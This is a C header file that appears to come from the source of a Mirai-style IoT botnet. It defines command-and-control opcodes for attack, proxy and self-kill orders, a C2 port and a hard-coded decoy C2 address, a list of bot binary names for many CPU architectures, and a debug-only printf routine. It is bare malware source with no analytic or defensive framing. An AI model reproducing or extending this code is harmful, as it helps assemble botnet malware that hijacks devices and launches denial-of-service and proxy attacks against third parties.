#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>

#define STDIN   0
#define STDOUT  1
#define STDERR  2

#define FALSE   0
#define TRUE    1

typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#define MAX_PATH_LENGTH 256
#define EVENT_SIZE (sizeof(struct inotify_event))
#define BUF_LEN (MAX_EVENTS * (EVENT_SIZE + 16))

#define FAKE_CNC_ADDR 	INET_ADDR(115,11,111,11)
#define FAKE_CNC_PORT 	22

#define CNC_PORT 1995

#define BUFFER 1024

extern ipv4_t LOCAL_ADDR;

static int enable = 1;

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
#define NONBLOCK(fd) (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)))
#define REUSE_ADDR(fd) (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int)));
#define REUSE_PORT(fd) (setsockopt(fd, SOL_SOCKET, SO_REUSEPORT, &enable, sizeof(int)));

#define MAX_CNC_TRIES 1000

#define LOCALHOST (INET_ADDR(127,0,0,1))

#define CNC_OP_PING         0x00
#define CNC_OP_KILLSELF     0x10
#define CNC_OP_KILLATTKS    0x20
#define CNC_OP_PROXY        0x30
#define CNC_OP_ATTACK       0x40

uint8_t GET_UID;
int lockdown;
ipv4_t LOCAL_ADDR;
struct resolv_entries *entries;
char id_buf[32];
int sprintf(char *str, const char *format, ...);
void *memset(void *s, int c, size_t n);
char *strstr(const char *haystack, const char *needle);
char *strtok(char *str, const char *delim);
int remove(const char *pathname);
int system(const char *command);
char *itoa(int value, char *str, int base);
int strcmp(const char *s1, const char *s2);
void *calloc(size_t nmemb, size_t size);

static char *arch_names[] = {"main.arm", "main.arm5", "main.arm6", "main.arm7", "main.mips", "main.mpsl", "main.x86_64", "main.sh4", "main.ppc", "main.m68k", "main.x86"};

#ifdef DEBUG
static char *outptr;
static void xputc(char c)
{
	if (outptr) {
		*outptr++ = (unsigned char)c;
		return;
	} else {
		write(0, &c, 1);
	}
}

static void xputs(const char *str)
{
	while (*str)
		xputc(*str++);
}

static void xvprintf(const char *fmt, va_list arp)
{
	unsigned int r, i, j, w, f;
	unsigned long v;
	char s[16], c, d, *p;
	for (;;) {
		c = *fmt++;					/* Get a char */
		if (!c) break;				/* End of format? */
		if (c != '%') {				/* Pass through it if not a % sequense */
			xputc(c); continue;
		}
		f = 0;
		c = *fmt++;					/* Get first char of the sequense */
		if (c == '0') {				/* Flag: '0' padded */
			f = 1; c = *fmt++;
		} else {
			if (c == '-') {			/* Flag: left justified */
				f = 2; c = *fmt++;
			}
		}
		for (w = 0; c >= '0' && c <= '9'; c = *fmt++)	/* Minimum width */
			w = w * 10 + c - '0';
		if (c == 'l' || c == 'L') {	/* Prefix: Size is long int */
			f |= 4; c = *fmt++;
		}
		if (!c) break;				/* End of format? */
		d = c;
		//toupper
		if (d >= 'a') d -= 0x20;
		switch (d) {				/* Type is... */
		case 'S' :					/* String */
			p = va_arg(arp, char*);
			for (j = 0; p[j]; j++) ;
			while (!(f & 2) && j++ < w) xputc(' ');
			xputs(p);
			while (j++ < w) xputc(' ');
			continue;
		case 'C' :					/* Character */
			xputc((char)va_arg(arp, int)); continue;
		case 'B' :					/* Binary */
			r = 2; break;
		case 'O' :					/* Octal */
			r = 8; break;
		case 'D' :					/* Signed decimal */
		case 'U' :					/* Unsigned decimal */
			r = 10; break;
		case 'X' :					/* Hexdecimal */
			r = 16; break;
		default:					/* Unknown type (passthrough) */
			xputc(c); continue;
		}

		/* Get an argument and put it in numeral */
		v = (f & 4) ? va_arg(arp, long) : ((d == 'D') ? (long)va_arg(arp, int) : (long)va_arg(arp, unsigned int));
		if (d == 'D' && (v & 0x80000000)) {
			v = 0 - v;
			f |= 8;
		}
		i = 0;
		do {
			d = (char)(v % r); v /= r;
			if (d > 9) d += (c == 'x') ? 0x27 : 0x07;
			s[i++] = d + '0';
		} while (v && i < sizeof(s));
		if (f & 8) s[i++] = '-';
		j = i; d = (f & 1) ? '0' : ' ';
		while (!(f & 2) && j++ < w) xputc(d);
		do xputc(s[--i]); while(i);
		while (j++ < w) xputc(' ');
	}
}

static void xprintf(const char *fmt, ...)
{
	va_list arp;
	va_start(arp, fmt);
	xvprintf(fmt, arp);
	va_end(arp);
}
#define printf xprintf

#endif
